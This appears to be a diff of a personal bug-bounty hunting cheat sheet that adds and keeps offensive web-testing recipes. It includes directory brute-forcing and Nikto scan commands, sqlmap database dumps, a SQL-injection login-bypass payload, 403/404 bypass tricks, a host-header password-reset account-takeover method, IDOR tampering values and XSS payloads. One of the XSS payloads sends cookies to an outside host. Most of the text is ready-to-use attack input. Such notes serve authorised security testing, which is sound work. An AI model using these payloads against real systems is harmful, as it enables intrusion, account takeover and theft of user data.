@@ -6,6 +6,10 @@ https://www.bugbountyhunting.com
 
 [Search for: Tips- Write-ups - Payloads - and more]
 
+urls = []$$('*').forEach(element => {  urls.push(element.src)  urls.push(element.href)  urls.push(element.url)}); console.log(...new Set(urls))
+
+[javascript How to extract urls,srcs and hrefs from all HTML elements in any website? Open DevTools and run ]
+
 https://dencode.com/en/
 
 [encode and decode]
@@ -188,6 +192,8 @@ home/000~ROOT~000/
 
 /app/config
 
+/db_live
+
 /config.local.neon
 
 /app/etc/local.xml
@@ -268,6 +274,7 @@ datasources:
 - $gobuster dir -u "[https://on](https://one.newrelic.com/dashboards?account=4676549&state=e196b296-20dd-0a38-aaf8-063779307cff).com" -w /usr/share/wordlists/common.txt  [directory bruteforcing]
 - gobuster dir -u URL.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 308
 - gobuster dir -u “URL.com” -w /usr/share/wordlists/raft-large-directories.txt --exclude-length 645
+- gobuster dir -u “URL.com” -w /usr/share/wordlists/raft-large-directories.txt  -b 200
 - go install [github.com/tomnomnom/assetfinder@latest](http://github.com/tomnomnom/assetfinder@latest)
 - export PATH=$PATH:$(go env GOPATH)/bin
 - assetfinder -subs-only URL.COM
@@ -365,7 +372,7 @@ N.B:
 - | sort -u eliminates duplicate subdomains for amass and subfinder whole “=” does same for crawled endpoints using tools like gau, katana or wayback.
 - cat new.txt file.txt for.txt | sort -u [ways to cat and sort all subdomains]
 - Assetfinder for subdomain enumeration
-- If you want to append to the file rather than overwrite it, use `>>` instead of `>`:
+- If you want to append to the file rather than overwrite it, use `>>` instead of `>`:
 - Subzy for subdomain takeover
 - Termux
 
@@ -373,6 +380,12 @@ N.B:
 export GOPATH=$HOME/go
 export PATH=$PATH:$GOPATH/bin
 ```
+
+# AUTOMATED SCAN
+
+[+] nikto -h [https://WEBSITE.com](https://requestmechanic.com/) -Tuning 123 -o nini.txt -Format txt
+
+[using Nikto to run a fullscan]
 
 # GO-TO:
 
@@ -442,6 +455,12 @@ sudo openvpn nmap -sV {target IP}
 
 [+] in host header add <burpcollaburl.com:redactedurl.com> then reset the password 
 
+[+] X-FORWARDED-HOST : collaborator for ATO 
+
+- Do this while Sending password reset or receiving registration link confirmation request
+
+[+] 
+
 #LFI
 [+] intercept download file and check if file path before endpoint is in '.php?'
 
@@ -487,11 +506,25 @@ sudo openvpn nmap -sV {target IP}
 
 - you can also switch the positions of the attacker and host websites/ URL encoded the special characters also.
 
-#BYPASS A 404
+#BYPASS A 404 
 [+]Enumerate with "gobuster dir -u (URL) -u (wordlist_path) -x (.exentension eg .php)
 
 - load url with target extension and "Do intercept" then forward
-- when you hit a redirect back to login page, change the "302 Found" to "200 ok"
+- when you hit a redirect back to login page, change the "302 Found" to "200 OK"
+
+#BYPASS 403 FORBIDDEN 
+
+[+] Use path normalization (Curl or Caido)
+
+- curl “[URL.com/./secrets](http://URL.com/./secrets).txt”
+
+[+] Use curl “X-FORWARDED-FOR: 127.0.0.1” URL.com
+
+[+] URL encode part of your url
+
+[+] Referrer: [URL.com/admin](http://URL.com/admin) 
+
+- Pass the admin into referrer header into the request body
 
 #DIR ENUMERATION/INFORMATION DISCLOSURE
 [+] look for robots.txt files and open -- Information disclosure
@@ -626,6 +659,10 @@ curl -H "Origin: https://malicious.com" -I https://vulnerable-site.com
 - sqlmap -u "url" -T accounts -D owasp10 --dump ---open all database file
 [+] test url endpoints
 
+[+] User: ad||min' Password: ' OR '1'='1' --
+
+- Bypass admin portal login with payload as credentials
+
 #SQLMAP 
 
 - sqlmap -r login.txt --batch --dbs
@@ -646,18 +683,36 @@ curl -H "Origin: https://malicious.com" -I https://vulnerable-site.com
 - Copy a user ID to view another users sensitive information/ create 2 accounts
 - Test user ID section with "administrator/admin" and view value parameter for hashed password --IDOR leading to BAC
 - Test the live chat section by forwarding VIEW TRANSCIPT txt requests on Burp till theres a get request, change the txt number and see if you can download another user's chat history
+
 [+] Intercept email update on user profile
--forward to repeater, get a RESPONSE to view "role ID"
+
+- forward to repeater, get a RESPONSE to view "role ID"
 -add "," and enter new line in REQUEST then paste "role ID = "
--change the ID to number that gives admin privilege --to test if user role can be changed in user profile
+- change the ID to number that gives admin privilege --to test if user role can be changed in user profile
+
 [+] Test URL by entering "/admin"
+
 - intercerpt and reload "/admin" error messages
-- if there"s no param to show you're not admin foward packets again to checek useful info
+- if there’s no param to show you're not admin forward packets again to cheek useful info
 - if there's no useful info intercerpt and reload "/admin" error messages again and change GET to TRACE, admin file should be downloaded
 - turn off interceptor and replace the IP in the file to a default localhost IP 127.0.0.1
-- copy XSS row containing IP to macth and replace section in burp proxy and reload page--auth bypass via information disclosure
+- copy XSS row containing IP to match and replace section in burp proxy and reload page --auth bypass via information disclosure
 
 [+] add <;%09/UUID >in request header parameter To get IDOR 
+
+#IDOR 
+
+[+] Try JSON globbing 
+
+- Array ID [1234, 1236]
+- Negative value id < -1>
+- Decimal numbers <12345.0>
+- String value with delinter < “12345, 12346” >
+- Wild cards < * OR % >
+- Boolean value < true OR false >
+- Large integer values < 00012345 >
+
+[+] 
 
 #PATH/DIR TRIVERSAL
 [+] Test if you can load images/pages by manipulating endpoint with "=" sign
@@ -749,7 +804,7 @@ Use our https://X55.is ✨ domain
 [+] <img src=x onerror=this.src='http://
 /?'+document.cookie;> — Steal cookies 
 
-[+] </script>'"><img src=x onError=prompt(1)>
+[+] </script>'"><img src=x onError=prompt(1)>
 
 [+] <script>alert(1)<! –
 
